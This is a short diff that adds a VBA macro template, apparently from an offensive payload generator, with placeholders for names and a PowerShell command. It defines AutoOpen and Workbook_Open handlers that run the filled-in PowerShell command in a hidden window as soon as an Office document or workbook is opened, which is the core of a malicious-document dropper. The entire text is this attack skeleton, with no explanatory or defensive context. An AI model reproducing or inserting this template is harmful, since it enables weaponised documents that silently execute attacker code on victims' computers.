@@ -1,0 +1,12 @@
+Sub %{sub_auto_open}()
+  Dim %{var_powershell}
+  %{var_powershell} = %{powershell}
+  Call Shell(%{var_powershell}, vbHide)
+End Sub
+Sub AutoOpen()
+  %{sub_auto_open}
+End Sub
+Sub Workbook_Open()
+  %{sub_auto_open}
+End Sub
+
